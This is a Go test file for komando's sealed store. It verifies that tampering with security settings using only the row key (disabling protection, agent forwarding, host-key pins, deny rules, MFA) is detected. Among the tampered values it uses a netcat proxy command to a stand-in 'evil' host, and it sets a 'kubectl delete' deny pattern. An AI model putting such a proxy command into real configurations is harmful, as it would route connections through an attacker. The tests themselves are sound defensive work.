package store

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/sgnd/komando/internal/out"
	"github.com/sgnd/komando/internal/sealdb"
)

// rowKeyHandle opens this home's store as a process given only the row
// key could (the vault agent hands it out): it seals rows, but has no
// policy key. fakeKeys' master key.
func rowKeyHandle(t *testing.T) *sealdb.DB {
	t.Helper()
	ks, err := keysFor(bytes.Repeat([]byte{7}, 32), newestFormat)
	if err != nil {
		t.Fatal(err)
	}
	d, err := sealdb.Open(context.Background(), DBPath(), ks.row)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { d.Close() })
	return d
}

// rowKeyEdit changes, with the row key alone, the first record of typ
// whose JSON field key holds want.
func rowKeyEdit(t *testing.T, typ, key, want string, edit func(m map[string]any)) {
	t.Helper()
	err := rowKeyHandle(t).Update(context.Background(), func(tx *sealdb.Tx) error {
		rows, err := tx.List(typ)
		if err != nil {
			return err
		}
		for _, r := range rows {
			var m map[string]any
			if err := json.Unmarshal(r.Data, &m); err != nil {
				return err
			}
			if key == "" || m[key] == want {
				edit(m)
				b, _ := json.Marshal(m)
				_, err := tx.Put(typ, r.ID, b)
				return err
			}
		}
		t.Fatalf("no %s record with %s %q", typ, key, want)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	Close()
}

// safetyHome is a store with a row of every safety part, made through
// komando's own handle (so with its policy MAC).
func safetyHome(t *testing.T) {
	t.Helper()
	sealedStore(t)
	update(t, func(s *State) {
		s.Hosts["web"] = &Host{Name: "web", Address: "10.0.0.1", Protected: true, Notes: "prod"}
		s.Hosts["plain"] = &Host{Name: "plain", Address: "10.0.0.2"}
		s.Conns["db"] = &Conn{Name: "db", Kind: "postgres", URL: "postgres://db/x", Protected: true, TrustedPlugin: "abc"}
		s.Vpns["office"] = &Vpn{Name: "office", Kind: "socks", MFA: true}
		s.Settings.ExtraDenyPattern = []string{`kubectl\s+delete`}
		s.Settings.ApprovalCode = true
	})
	d, err := DB(false)
	if err != nil {
		t.Fatal(err)
	}
	err = d.Update(context.Background(), func(tx *sealdb.Tx) error {
		for typ, data := range map[string]string{
			KindPin:        `{"addr":"10.0.0.1:22","keys":["ssh-ed25519 AAAA"]}`,
			KindPinRevoked: `{"keys":["ssh-ed25519 BBBB"]}`,
			KindHostCA:     `{"name":"corp","key":"ssh-ed25519 CCCC","hosts":["*.corp.example"]}`,
		} {
			if _, err := tx.Put(typ, "", []byte(data)); err != nil {
				return err
			}
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	Close()
}

// policyRefused checks that loading stops with POLICY_MAC_FAILED naming
// the row.
func policyRefused(t *testing.T, row string) {
	t.Helper()
	_, err := Load()
	var oe *out.Error
	if !errors.As(err, &oe) || oe.Code != "POLICY_MAC_FAILED" || oe.Exit != out.ExitError {
		t.Fatalf("got %v, want POLICY_MAC_FAILED", err)
	}
	if !strings.Contains(oe.Message, row) {
		t.Errorf("the message does not name %q: %s", row, oe.Message)
	}
}

// Each part of the safety subset, changed with the row key alone, stops
// komando with the code and the row's name.
func TestPolicyTamperRefused(t *testing.T) {
	set := func(k string, v any) func(m map[string]any) { return func(m map[string]any) { m[k] = v } }
	for _, tc := range []struct {
		name, typ, key, want, row string
		edit                      func(m map[string]any)
	}{
		{"protected mark off", KindHost, "name", "web", "server web", set("protected", false)},
		{"proxy command", KindHost, "name", "plain", "server plain", set("proxy_command", "nc evil 22")},
		{"forward agent", KindHost, "name", "plain", "server plain", set("forward_agent", true)},
		{"conn protection off", KindConn, "name", "db", "conn db", set("protected", false)},
		{"trusted plugin", KindConn, "name", "db", "conn db", set("trusted_plugin", "evil")},
		{"VPN mfa off", KindVpn, "name", "office", "VPN office", set("mfa", false)},
		{"deny rule removed", kindSettings, "", "", "settings", set("extra_deny_patterns", []string{})},
		{"approval code off", kindSettings, "", "", "settings", set("approval_code", false)},
		{"host keys off", kindSettings, "", "", "settings", set("host_key_policy", "off")},
		{"pinned key", KindPin, "addr", "10.0.0.1:22", "host key pin 10.0.0.1:22", set("keys", []string{"ssh-ed25519 EVIL"})},
		{"revoked keys", KindPinRevoked, "", "", "revoked host keys", set("keys", []string{})},
		{"host CA", KindHostCA, "name", "corp", "host CA corp", set("hosts", []string{"*"})},
	} {
		t.Run(tc.name, func(t *testing.T) {
			safetyHome(t)
			rowKeyEdit(t, tc.typ, tc.key, tc.want, tc.edit)
			policyRefused(t, tc.row)
		})
	}
}

// The meta seal: a lower scrypt cost written with the row key alone, the
// meta table and its sealed copy kept in step, still stops komando.
func TestPolicyMetaSeal(t *testing.T) {
	safetyHome(t)
	err := rowKeyHandle(t).Update(context.Background(), func(tx *sealdb.Tx) error { return tx.SetMeta("scrypt_n", "1024") })
	if err != nil {
		t.Fatal(err)
	}
	Close()
	policyRefused(t, "meta seal")
}

// Names, notes and display settings stay outside the MAC.
func TestPolicyNonSafetyFree(t *testing.T) {
	safetyHome(t)
	rowKeyEdit(t, KindHost, "name", "web", func(m map[string]any) { m["notes"] = "changed"; m["name"] = "web-renamed" })
	rowKeyEdit(t, KindHost, "name", "plain", func(m map[string]any) { m["address"] = "10.0.0.9" })
	rowKeyEdit(t, kindSettings, "", "", func(m map[string]any) { m["parallel"] = 3; m["approval_language"] = "id" })
	s, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if h := s.Hosts["web-renamed"]; h == nil || !h.Protected || s.Settings.Parallel != 3 {
		t.Errorf("hosts %v, parallel %d", s.Hosts, s.Settings.Parallel)
	}
}

// policyVersion is the version of the store's policymac record.
func policyVersion(t *testing.T) uint64 {
	t.Helper()
	var v uint64
	err := rowKeyHandle(t).View(context.Background(), func(tx *sealdb.Tx) error {
		r, err := tx.Get("policymac")
		v = r.Version
		return err
	})
	if err != nil {
		t.Fatal(err)
	}
	return v
}

// A change through komando writes the MAC again in the same step.
func TestPolicyLegitWrite(t *testing.T) {
	safetyHome(t)
	before := policyVersion(t)
	update(t, func(s *State) {
		s.Hosts["plain"].Protected = true
		s.Settings.ExtraDenyPattern = nil
	})
	Close()
	if v := policyVersion(t); v != before+1 {
		t.Errorf("policymac version %d, want %d", v, before+1)
	}
	s, err := Load()
	if err != nil || !s.Hosts["plain"].Protected {
		t.Fatalf("after a change through komando: %v", err)
	}
}

// A store an older komando made (format 1, no MAC) gets its MAC once,
// on the way to format 3 at a person's first open, and loads again. A MAC
// stripped after that stops komando: it is never made again.
func TestPolicyUpgradeOnce(t *testing.T) {
	sealedStore(t)
	sealdb.CreateFormat = 1
	t.Cleanup(func() { sealdb.CreateFormat = sealdb.Format })
	d, err := DB(true)
	if err != nil {
		t.Fatal(err)
	}
	old := &State{Settings: DefaultSettings()}
	old.init()
	old.Hosts["web"] = &Host{Name: "web", Address: "10.0.0.1", Protected: true}
	if err := d.Update(context.Background(), func(tx *sealdb.Tx) error { return putFormat2(tx, old) }); err != nil {
		t.Fatal(err)
	}
	sealdb.CreateFormat = sealdb.Format
	Close()
	if m, _ := sealdb.Peek(context.Background(), DBPath()); m["format"] != "1" {
		t.Fatalf("the old store is of format %q", m["format"])
	}
	callerIs(t, atTerminal())
	for range 2 {
		s, err := Load()
		if err != nil {
			t.Fatalf("loading an old store: %v", err)
		}
		if !s.Hosts["web"].Protected {
			t.Errorf("after the upgrade: %v", s.Hosts)
		}
		Close()
	}
	if m, _ := sealdb.Peek(context.Background(), DBPath()); m["format"] != "3" {
		t.Fatalf("format %q after the upgrade", m["format"])
	}
	err = rowKeyHandle(t).Update(context.Background(), func(tx *sealdb.Tx) error { return tx.Delete("policymac") })
	if err != nil {
		t.Fatal(err)
	}
	Close()
	policyRefused(t, "no policy MAC")
	policyRefused(t, "no policy MAC") // still: nothing made it again
}

// The marker of an upgraded store is its format and its row key: turning
// the format back to 1 to have the MAC made again does not work, as the
// rows open only with the new row key.
func TestPolicyFormatRollbackRefused(t *testing.T) {
	safetyHome(t)
	db, err := sql.Open("sqlite", "file:"+DBPath())
	if err != nil {
		t.Fatal(err)
	}
	_, err = db.Exec(`UPDATE meta SET v='1' WHERE k='format'`)
	db.Close()
	if err != nil {
		t.Fatal(err)
	}
	ks, _ := keysFor(bytes.Repeat([]byte{7}, 32), newestFormat)
	if _, err := sealdb.ResealMeta(context.Background(), DBPath(), ks.row, nil); err != nil {
		t.Fatal(err)
	}
	before := policyVersion(t)
	_, err = Load()
	var oe *out.Error
	if !errors.As(err, &oe) || oe.Code != "STATE_CORRUPT" {
		t.Fatalf("a store set back to format 1: %v", err)
	}
	Close()
	if m, _ := sealdb.Peek(context.Background(), DBPath()); m["format"] != "1" || policyVersion(t) != before {
		t.Errorf("the store was upgraded again: %v", m)
	}
}

// A part's label names the record it read, however many it read before.
func TestWholeNamedLabel(t *testing.T) {
	part := wholeNamed("host key pin", "addr")
	for _, addr := range []string{"10.0.0.5:22", "10.0.0.1:22", "10.0.0.1:22"} {
		_, label, err := part([]byte(`{"addr":"` + addr + `"}`))
		if err != nil || label != "host key pin "+addr {
			t.Fatalf("label %q (%v), want %q", label, err, "host key pin "+addr)
		}
	}
}
